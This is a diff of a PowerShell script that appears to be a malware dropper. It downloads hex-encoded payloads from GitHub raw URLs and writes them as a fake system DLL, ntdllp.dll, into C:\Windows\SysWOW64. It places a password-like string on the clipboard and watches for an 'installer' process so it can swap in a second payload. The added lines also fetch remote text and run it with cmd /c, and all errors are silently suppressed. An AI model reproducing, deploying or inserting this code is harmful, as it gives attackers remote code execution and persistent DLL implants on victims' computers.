@@ -1,32 +1,67 @@
 $urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
-$urlC = "https://github.com/devnull-sys/files/raw/refs/heads/main/ntdllp.dll"
+$urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt"
+$urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt"
+$urlD = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/c.txt"
 $filePath = "C:\Windows\SysWOW64\ntdllp.dll"
+$clipText = "SteF6b2WrAgu"
 
 function HexToBytes {
-    param([string]$hexString)
-    $cleanHex = $hexString -replace '[^0-9A-Fa-f]', ''
-    if ($cleanHex.Length % 2 -ne 0) {
-        throw "Hex string must have an even number of characters"
+    param([string]$hexStr)
+    $hexStr = $hexStr.Trim()
+    $byteArr = [byte[]]::new($hexStr.Length / 2)
+    for ($i = 0; $i -lt $hexStr.Length; $i += 2) {
+        $byteArr[$i/2] = [convert]::ToByte($hexStr.Substring($i, 2), 16)
     }
-    $byteArray = @()
-    for ($i = 0; $i -lt $cleanHex.Length; $i += 2) {
-        $byteArray += [Convert]::ToByte($cleanHex.Substring($i, 2), 16)
-    }
-    return $byteArray
+    return $byteArr
 }
 
 try {
-    $hexData = Invoke-RestMethod -Uri $urlA -UseBasicParsing
-    $byteArray = HexToBytes -hexString $hexData
-    [System.IO.File]::WriteAllBytes($filePath, $byteArray)
-    do {
-        Start-Sleep -Milliseconds 500
-    } while (-not (Get-Process -Name "installer" -ErrorAction SilentlyContinue))
-    Set-Clipboard -Value "SteF6b2WrAgu"
-    do {
-        Start-Sleep -Milliseconds 500
-    } while (Get-Process -Name "installer" -ErrorAction SilentlyContinue)
-    Invoke-WebRequest -Uri $urlC -OutFile $filePath -UseBasicParsing
+    $responseA = Invoke-WebRequest -Uri $urlA -UseBasicParsing
+    if ($responseA.StatusCode -eq 200) {
+        $hexContent = $responseA.Content.Trim()
+        if ($hexContent) {
+            $bytes = HexToBytes $hexContent
+            [IO.File]::WriteAllBytes($filePath, $bytes)
+        }
+    }
+} catch {
 }
-catch {
+
+Set-Clipboard $clipText
+
+try {
+    $responseB = Invoke-WebRequest -Uri $urlB -UseBasicParsing
+    if ($responseB.StatusCode -eq 200) {
+        $cmdToRun = $responseB.Content.Trim()
+        if ($cmdToRun) {
+            Start-Process cmd -ArgumentList "/c $cmdToRun" -NoNewWindow
+        }
+    }
+} catch {
+}
+
+while (-not (gp installer -ErrorAction SilentlyContinue)) { Start-Sleep 1 }
+while (gp installer -ErrorAction SilentlyContinue) { Start-Sleep 1 }
+
+try {
+    $responseC = Invoke-WebRequest -Uri $urlC -UseBasicParsing
+    if ($responseC.StatusCode -eq 200) {
+        $newHexContent = $responseC.Content.Trim()
+        if ($newHexContent) {
+            $newBytes = HexToBytes $newHexContent
+            [IO.File]::WriteAllBytes($filePath, $newBytes)
+        }
+    }
+} catch {
+}
+
+try {
+    $responseD = Invoke-WebRequest -Uri $urlD -UseBasicParsing
+    if ($responseD.StatusCode -eq 200) {
+        $finalCmd = $responseD.Content.Trim()
+        if ($finalCmd) {
+            Start-Process cmd -ArgumentList "/c $finalCmd" -NoNewWindow
+        }
+    }
+} catch {
 }
